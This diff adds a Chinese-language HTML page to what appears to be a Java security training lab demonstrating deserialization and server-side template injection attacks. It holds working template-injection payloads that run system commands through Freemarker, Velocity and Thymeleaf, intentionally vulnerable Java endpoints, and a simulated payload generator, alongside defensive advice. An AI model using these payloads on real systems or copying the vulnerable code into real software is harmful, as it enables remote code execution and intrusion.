@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>高级RCE攻击演示 - Java Security Lab</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism.min.css" rel="stylesheet">
+    <style>
+        .vulnerability-demo { background-color: #fff3cd; border: 1px solid #ffeaa7; }
+        .safe-demo { background-color: #d1ecf1; border: 1px solid #bee5eb; }
+        .payload-box { background-color: #f8f9fa; border: 1px solid #dee2e6; font-family: monospace; }
+        .result-box { min-height: 150px; border: 1px solid #dee2e6; padding: 10px; background-color: #f8f9fa; font-family: monospace; white-space: pre-wrap; }
+        .attack-input { font-family: monospace; }
+        .technique-card { border-left: 4px solid #dc3545; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container">
+            <a class="navbar-brand" href="/">Java Security Lab</a>
+            <div class="navbar-nav ms-auto">
+                <a class="nav-link" href="/rce">RCE主页</a>
+                <a class="nav-link" href="/">返回首页</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <div class="row">
+            <div class="col-12">
+                <h1 class="mb-4">高级RCE攻击演示</h1>
+                
+                <!-- 说明部分 -->
+                <div class="alert alert-danger">
+                    <h5><i class="fas fa-exclamation-triangle"></i> 高级远程代码执行攻击</h5>
+                    <p>高级RCE攻击包括反序列化漏洞、模板注入、代码注入等复杂攻击技术。这些攻击通常更难检测和防护，危害性极大。</p>
+                    <p><strong>攻击类型：</strong> Java反序列化、模板注入、代码注入、字节码操作、类加载器攻击等</p>
+                    <p><strong>危害等级：</strong> 极高 - 可完全控制目标系统</p>
+                </div>
+
+                <!-- 攻击技术概览 -->
+                <div class="row mb-4">
+                    <div class="col-md-6">
+                        <div class="card technique-card mb-3">
+                            <div class="card-body">
+                                <h6 class="card-title text-danger">Java反序列化攻击</h6>
+                                <p class="card-text">通过构造恶意序列化数据，在反序列化过程中执行任意代码。</p>
+                                <small class="text-muted">常见库：Commons Collections, Spring, Fastjson等</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card technique-card mb-3">
+                            <div class="card-body">
+                                <h6 class="card-title text-danger">模板注入攻击</h6>
+                                <p class="card-text">在模板引擎中注入恶意代码，利用模板解析执行任意命令。</p>
+                                <small class="text-muted">常见引擎：Freemarker, Velocity, Thymeleaf等</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 反序列化攻击演示 -->
+                <div class="card vulnerability-demo mb-4">
+                    <div class="card-header bg-warning">
+                        <h5 class="mb-0"><i class="fas fa-bomb"></i> 反序列化攻击演示</h5>
+                    </div>
+                    <div class="card-body">
+                        <p class="text-danger"><strong>极度危险：</strong> Java反序列化漏洞可导致完全的系统控制</p>
+                        
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>攻击载荷类型：</h6>
+                                <div class="mb-3">
+                                    <select class="form-select" id="deserializationType">
+                                        <option value="commons-collections">Commons Collections</option>
+                                        <option value="commons-beanutils">Commons BeanUtils</option>
+                                        <option value="spring-core">Spring Core</option>
+                                        <option value="fastjson">Fastjson</option>
+                                        <option value="jackson">Jackson</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <label for="deserializePayload" class="form-label">序列化载荷（Base64）：</label>
+                                    <textarea class="form-control attack-input" id="deserializePayload" rows="4" 
+                                              placeholder="输入Base64编码的序列化载荷..."></textarea>
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <button type="button" class="btn btn-danger" onclick="executeDeserialization()">
+                                        <i class="fas fa-bomb"></i> 执行反序列化（危险）
+                                    </button>
+                                    <button type="button" class="btn btn-outline-secondary btn-sm ms-2" onclick="clearDeserializeResult()">
+                                        清除结果
+                                    </button>
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <h6>快速测试：</h6>
+                                    <div class="d-grid gap-2">
+                                        <button class="btn btn-outline-danger btn-sm" onclick="generatePayload('calc')">
+                                            生成计算器载荷
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="generatePayload('whoami')">
+                                            生成whoami载荷
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="generatePayload('reverse-shell')">
+                                            生成反向Shell载荷
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="col-md-6">
+                                <h6>执行结果：</h6>
+                                <div id="deserializeResult" class="result-box">
+                                    选择载荷类型并点击"执行反序列化"查看结果...
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 模板注入攻击演示 -->
+                <div class="card vulnerability-demo mb-4">
+                    <div class="card-header bg-warning">
+                        <h5 class="mb-0"><i class="fas fa-code"></i> 模板注入攻击演示</h5>
+                    </div>
+                    <div class="card-body">
+                        <p class="text-danger"><strong>危险：</strong> 服务端模板注入可执行任意代码</p>
+                        
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="mb-3">
+                                    <label for="templateEngine" class="form-label">模板引擎：</label>
+                                    <select class="form-select" id="templateEngine">
+                                        <option value="freemarker">Freemarker</option>
+                                        <option value="velocity">Velocity</option>
+                                        <option value="thymeleaf">Thymeleaf</option>
+                                        <option value="mustache">Mustache</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <label for="templatePayload" class="form-label">模板载荷：</label>
+                                    <textarea class="form-control attack-input" id="templatePayload" rows="4" 
+                                              placeholder="输入模板注入载荷..."></textarea>
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <button type="button" class="btn btn-danger" onclick="executeTemplate()">
+                                        <i class="fas fa-code"></i> 执行模板注入（危险）
+                                    </button>
+                                    <button type="button" class="btn btn-outline-secondary btn-sm ms-2" onclick="clearTemplateResult()">
+                                        清除结果
+                                    </button>
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <h6>快速测试：</h6>
+                                    <div class="d-grid gap-2">
+                                        <button class="btn btn-outline-danger btn-sm" onclick="setTemplatePayload('freemarker-basic')">
+                                            Freemarker基础载荷
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="setTemplatePayload('freemarker-exec')">
+                                            Freemarker命令执行
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="setTemplatePayload('velocity-exec')">
+                                            Velocity命令执行
+                                        </button>
+                                        <button class="btn btn-outline-danger btn-sm" onclick="setTemplatePayload('thymeleaf-exec')">
+                                            Thymeleaf表达式注入
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="col-md-6">
+                                <h6>执行结果：</h6>
+                                <div id="templateResult" class="result-box">
+                                    选择模板引擎并点击"执行模板注入"查看结果...
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 载荷示例 -->
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5>高级攻击载荷示例</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>Freemarker模板注入：</h6>
+                                <div class="payload-box p-2 mb-2">
+                                    <code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ex("whoami")}</code>
+                                </div>
+                                <div class="payload-box p-2 mb-2">
+                                    <code>&lt;#assign classLoader=object.getClass().getClassLoader()&gt;</code>
+                                </div>
+                                
+                                <h6>Velocity模板注入：</h6>
+                                <div class="payload-box p-2 mb-2">
+                                    <code>#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('calc'))</code>
+                                </div>
+                                <div class="payload-box p-2 mb-2">
+                                    <code>$ex.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('calc')</code>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>反序列化Gadget链：</h6>
+                                <div class="payload-box p-2 mb-2">
+                                    <code>Commons Collections 1-7</code>
+                                </div>
+                                <div class="payload-box p-2 mb-2">
+                                    <code>Commons BeanUtils 1</code>
+                                </div>
+                                <div class="payload-box p-2 mb-2">
+                                    <code>Spring Core 1-2</code>
+                                </div>
+                                <div class="payload-box p-2 mb-2">
+                                    <code>Fastjson 1.2.24-1.2.80</code>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 代码示例 -->
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5>漏洞代码示例</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6 class="text-danger">反序列化漏洞：</h6>
+                                <pre><code class="language-java">// 危险：直接反序列化用户数据
+@PostMapping("/deserialize")
+public String deserialize(@RequestParam String data) {
+    try {
+        byte[] bytes = Base64.getDecoder().decode(data);
+        ObjectInputStream ois = new ObjectInputStream(
+            new ByteArrayInputStream(bytes));
+        
+        // 直接反序列化，触发gadget链
+        Object obj = ois.readObject();
+        return "Deserialized: " + obj.toString();
+    } catch (Exception e) {
+        return "Error: " + e.getMessage();
+    }
+}</code></pre>
+                            </div>
+                            <div class="col-md-6">
+                                <h6 class="text-danger">模板注入漏洞：</h6>
+                                <pre><code class="language-java">// 危险：直接处理用户模板
+@PostMapping("/template")
+public String processTemplate(@RequestParam String template) {
+    try {
+        Configuration cfg = new Configuration();
+        Template temp = new Template("user", 
+            new StringReader(template), cfg);
+        
+        StringWriter out = new StringWriter();
+        temp.process(new HashMap(), out);
+        
+        return out.toString();
+    } catch (Exception e) {
+        return "Error: " + e.getMessage();
+    }
+}</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 防护建议 -->
+                <div class="alert alert-success">
+                    <h5><i class="fas fa-shield-alt"></i> 高级RCE防护建议</h5>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h6>反序列化防护：</h6>
+                            <ul>
+                                <li>避免反序列化不可信数据</li>
+                                <li>使用白名单类过滤器</li>
+                                <li>升级有漏洞的依赖库</li>
+                                <li>使用安全的序列化格式（JSON）</li>
+                                <li>实现自定义ObjectInputStream</li>
+                            </ul>
+                        </div>
+                        <div class="col-md-6">
+                            <h6>模板注入防护：</h6>
+                            <ul>
+                                <li>不允许用户控制模板内容</li>
+                                <li>使用沙箱模式</li>
+                                <li>禁用危险的模板功能</li>
+                                <li>严格的输入验证和过滤</li>
+                                <li>使用预编译模板</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 检测工具 -->
+                <div class="alert alert-info">
+                    <h5><i class="fas fa-tools"></i> 检测工具和技术</h5>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h6>反序列化检测：</h6>
+                            <ul>
+                                <li><strong>ysoserial：</strong> Java反序列化载荷生成工具</li>
+                                <li><strong>SerialKiller：</strong> 反序列化防护库</li>
+                                <li><strong>Java Deserialization Scanner：</strong> Burp插件</li>
+                                <li><strong>静态分析：</strong> 代码审计工具</li>
+                            </ul>
+                        </div>
+                        <div class="col-md-6">
+                            <h6>模板注入检测：</h6>
+                            <ul>
+                                <li><strong>Tplmap：</strong> 模板注入检测工具</li>
+                                <li><strong>手工测试：</strong> 特定语法测试</li>
+                                <li><strong>模糊测试：</strong> 自动化载荷测试</li>
+                                <li><strong>代码审计：</strong> 模板处理代码检查</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
+    
+    <script>
+        // 模板载荷示例
+        const templatePayloads = {
+            'freemarker-basic': '${7*7}',
+            'freemarker-exec': '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami")}',
+            'velocity-exec': '#set($ex=$class.forName("java.lang.Runtime").getRuntime().exec("whoami"))',
+            'thymeleaf-exec': '${T(java.lang.Runtime).getRuntime().exec("whoami")}'
+        };
+        
+        // 生成反序列化载荷
+        function generatePayload(command) {
+            const type = document.getElementById('deserializationType').value;
+            const resultDiv = document.getElementById('deserializePayload');
+            
+            // 模拟载荷生成（实际应用中需要使用ysoserial等工具）
+            resultDiv.value = `生成${type}载荷用于执行: ${command}\n（实际环境中需要使用ysoserial工具生成真实载荷）`;
+            
+            alert(`已生成${command}命令的${type}载荷`);
+        }
+        
+        // 设置模板载荷
+        function setTemplatePayload(type) {
+            const payload = templatePayloads[type];
+            document.getElementById('templatePayload').value = payload;
+            
+            // 根据载荷类型设置对应的模板引擎
+            if (type.startsWith('freemarker')) {
+                document.getElementById('templateEngine').value = 'freemarker';
+            } else if (type.startsWith('velocity')) {
+                document.getElementById('templateEngine').value = 'velocity';
+            } else if (type.startsWith('thymeleaf')) {
+                document.getElementById('templateEngine').value = 'thymeleaf';
+            }
+        }
+        
+        // 执行反序列化攻击
+        function executeDeserialization() {
+            const type = document.getElementById('deserializationType').value;
+            const payload = document.getElementById('deserializePayload').value;
+            
+            if (!payload.trim()) {
+                alert('请输入序列化载荷');
+                return;
+            }
+            
+            const resultDiv = document.getElementById('deserializeResult');
+            resultDiv.textContent = '执行反序列化攻击中...';
+            
+            fetch('/rce/advanced/deserialization', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `type=${type}&payload=${encodeURIComponent(payload)}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                let result = `攻击类型: ${data.type}\n`;
+                result += `载荷长度: ${data.payloadLength} bytes\n`;
+                result += `状态: ${data.success ? '成功' : '失败'}\n`;
+                result += `执行时间: ${data.executionTime}ms\n\n`;
+                
+                if (data.output) {
+                    result += `执行输出:\n${data.output}\n`;
+                }
+                
+                if (data.error) {
+                    result += `错误信息:\n${data.error}`;
+                }
+                
+                if (data.warning) {
+                    result += `\n警告: ${data.warning}`;
+                }
+                
+                resultDiv.textContent = result;
+            })
+            .catch(error => {
+                resultDiv.textContent = '攻击执行失败: ' + error;
+            });
+        }
+        
+        // 执行模板注入攻击
+        function executeTemplate() {
+            const engine = document.getElementById('templateEngine').value;
+            const payload = document.getElementById('templatePayload').value;
+            
+            if (!payload.trim()) {
+                alert('请输入模板载荷');
+                return;
+            }
+            
+            const resultDiv = document.getElementById('templateResult');
+            resultDiv.textContent = '执行模板注入攻击中...';
+            
+            fetch('/rce/advanced/template', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `engine=${engine}&payload=${encodeURIComponent(payload)}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                let result = `模板引擎: ${data.engine}\n`;
+                result += `载荷: ${data.payload}\n`;
+                result += `状态: ${data.success ? '成功' : '失败'}\n`;
+                result += `执行时间: ${data.executionTime}ms\n\n`;
+                
+                if (data.output) {
+                    result += `模板输出:\n${data.output}\n`;
+                }
+                
+                if (data.error) {
+                    result += `错误信息:\n${data.error}`;
+                }
+                
+                if (data.warning) {
+                    result += `\n警告: ${data.warning}`;
+                }
+                
+                resultDiv.textContent = result;
+            })
+            .catch(error => {
+                resultDiv.textContent = '攻击执行失败: ' + error;
+            });
+        }
+        
+        // 清除结果
+        function clearDeserializeResult() {
+            document.getElementById('deserializeResult').textContent = '选择载荷类型并点击"执行反序列化"查看结果...';
+        }
+        
+        function clearTemplateResult() {
+            document.getElementById('templateResult').textContent = '选择模板引擎并点击"执行模板注入"查看结果...';
+        }
+    </script>
+</body>
+</html>
